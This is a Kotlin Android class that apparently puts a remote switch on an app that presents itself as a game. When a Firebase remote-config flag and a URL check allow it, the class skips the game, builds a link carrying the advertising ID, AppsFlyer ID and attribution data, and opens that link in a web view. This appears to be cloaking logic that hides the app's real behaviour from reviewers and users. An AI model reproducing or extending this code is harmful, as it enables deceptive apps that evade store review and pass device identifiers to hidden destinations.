package io.likes.library.managers

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.AdjustConfig
import com.adjust.sdk.LogLevel
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.onesignal.OneSignal
import io.likes.library.FormBuilder
import io.likes.library.MainView
import io.likes.library.callbacks.MainCallback
import io.likes.library.storage.persistroom.model.Model
import io.likes.library.utils.Utils
import io.likes.library.utils.Utils.adbGet
import io.likes.library.utils.Utils.encode
import io.likes.library.utils.Utils.getAdvId
import io.likes.library.utils.Utils.rootGet
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.zip
import java.net.HttpURLConnection
import java.net.URL
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine


@InternalCoroutinesApi
class MainManager(private val activity: AppCompatActivity) {

    var guid = UUID.randomUUID()

    val firebaseAnalytics = FirebaseAnalytics.getInstance(activity)


    fun initialize() {


        val bundle = Bundle()
        bundle.putInt("test", 1)
        firebaseAnalytics.logEvent("app_started", bundle)

        var remoteListenerCallback = activity as MainCallback

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }


        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->


            if (task.isSuccessful) {

                val bundle2 = Bundle()
                bundle2.putInt("test", 1)
                firebaseAnalytics.logEvent("fetched_config", bundle2)

                OneSignal.initWithContext(activity.applicationContext)
                OneSignal.setAppId(Firebase.remoteConfig.getString("onesignal"))



                when (Firebase.remoteConfig.getString("status")) {
                    "false" -> {

                        val bundle5 = Bundle()
                        bundle5.putInt("test", 1)
                        firebaseAnalytics.logEvent("started_game", bundle5)

                        remoteListenerCallback.startGame()

                    }

                    "true" -> {


                        val list = FormBuilder.createRepoInstance(activity).getAllData()

                        if (list.isNotEmpty()) {

                            activity.startActivity(
                                Intent(activity, MainView::class.java).putExtra(
                                    "url",
                                    list.component1().link
                                )
                            )
                            activity.finish()

                        } else if (list.isEmpty()) {

                            Log.d("200ss", "true1")


                            activity.lifecycleScope.launch(Dispatchers.IO) {

                                Log.d("200ss", "true2")

                                var codes =
                                    getResponseCode(Firebase.remoteConfig.getString("urlCheck"))
                                Log.d("200ss", codes)

                                if(codes == "200"){
                                    activity.lifecycleScope.launch(Dispatchers.IO) {
                                        Log.d("200ss", "true44")
                                        setupMainCycle()

                                    }

                                } else if(codes == "404"){

                                    Log.d("200ss", "false44")

                                    val bundle5 = Bundle()
                                    bundle5.putInt("test", 1)
                                    firebaseAnalytics.logEvent("started_game", bundle5)
                                    remoteListenerCallback.startGame()
                                    activity.finish()
                                }



                            }


                        } else {

                            Log.d("200ss", "true12")



                            Log.d("200ss", "true22")

                            var codes = getResponseCode(Firebase.remoteConfig.getString("urlCheck"))
                            Log.d("200ss", codes)


                            if(codes == "200"){
                                activity.lifecycleScope.launch(Dispatchers.IO) {
                                    Log.d("200ss", "true222")
                                    setupMainCycle()

                                }

                            } else if(codes == "404"){

                                Log.d("200ss", "false242")

                                val bundle5 = Bundle()
                                bundle5.putInt("test", 1)
                                firebaseAnalytics.logEvent("started_game", bundle5)
                                remoteListenerCallback.startGame()
                                activity.finish()
                            }



                        }


                    }

                }
            } else {

                remoteListenerCallback.startGame()

            }

        }

    }


    suspend fun setupMainCycle() {

        val resourceOneFlow = flow {

            emit(requestAppsData())
        }

        val resourceTwoFlow = flow {

            emit(requestDeep())
        }


        val requestsResultFlow = resourceOneFlow.zip(resourceTwoFlow) { data, deep ->


            if (deep != "null") {

                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {
                    appendQueryParameter("sub12", Utils.getAppBundle(activity))
                    appendQueryParameter("afToken", Firebase.remoteConfig.getString("apps"))
                    appendQueryParameter(
                        "afid",
                        AppsFlyerLib.getInstance().getAppsFlyerUID(activity)
                    )
                    appendQueryParameter("sub11", "facebook")
                    appendQueryParameter("media_source", "facebook")
                    appendQueryParameter("advertising_id", getAdvId(activity))

                }.toString() + "&triger=${Utils.concatCampaign(deep)}"


            } else if (data.campaign != "null" && data.campaign != null) {


                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {

                    appendQueryParameter(
                        "click_id",
                        (activity.packageName + "-" + guid.toString()).encode()
                    )
                    appendQueryParameter("token", Firebase.remoteConfig.getString("adjust"))
                    appendQueryParameter("atribut", data.toString())
                    appendQueryParameter("gps_adid", data.adid)
                    appendQueryParameter("app_id", activity.packageName)


                }.toString()


            } else {


                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {

                    appendQueryParameter(
                        "click_id",
                        (activity.packageName + "-" + guid.toString()).encode()
                    )
                    appendQueryParameter("token", Firebase.remoteConfig.getString("adjust"))
                    appendQueryParameter("atribut", data.toString())
                    appendQueryParameter("gps_adid", data.adid)
                    appendQueryParameter("app_id", activity.packageName)


                }
            }

        }



        requestsResultFlow.collect { length ->

            val bundle3 = Bundle()
            bundle3.putString("ur", length.toString())
            firebaseAnalytics.logEvent("url_created", bundle3)

            Log.d("adjust", "$length links")

            FormBuilder.createRepoInstance(activity).insert(Model(1, length.toString()))

            activity.startActivity(
                Intent(activity, MainView::class.java).putExtra(
                    "url",
                    length.toString()
                )
            )
            activity.finish()

        }


    }


    @OptIn(ExperimentalCoroutinesApi::class)
    suspend fun requestAppsData(): AdjustAttribution =
        suspendCancellableCoroutine { cont ->
            GlobalScope.launch {
                cont.resume(getsPromt(activity))
            }


        }


    suspend fun getsPromt(activity: AppCompatActivity): AdjustAttribution = suspendCoroutine {

        val appToken = Firebase.remoteConfig.getString("adjust")
        val environment = AdjustConfig.ENVIRONMENT_PRODUCTION
        val config = AdjustConfig(activity.applicationContext, appToken, environment)
        config.setLogLevel(LogLevel.VERBOSE);




        config.setOnAttributionChangedListener { it2 ->

            val bundle4 = Bundle()
            bundle4.putString("conversion", it2.toString())
            firebaseAnalytics.logEvent("conversion_get", bundle4)

            Log.d("adjust", "$it2 atts")

            it.resume(it2)


        }

        Adjust.onCreate(config)
        Adjust.addSessionCallbackParameter("user_uuid", guid.toString())
        Adjust.onResume()

    }

    suspend fun requestDeep(): String =
        suspendCancellableCoroutine { cont ->
            AppLinkData.fetchDeferredAppLinkData(activity) {


                if (it != null) {

                    cont.resume(it.targetUri.toString())

                } else {

                    cont.resume("null")

                }

            }
        }


    fun getResponseCode(url: String): String {

        val openUrl = URL(url)
        val http: HttpURLConnection = openUrl.openConnection() as HttpURLConnection
        return http.responseCode.toString()

    }
}

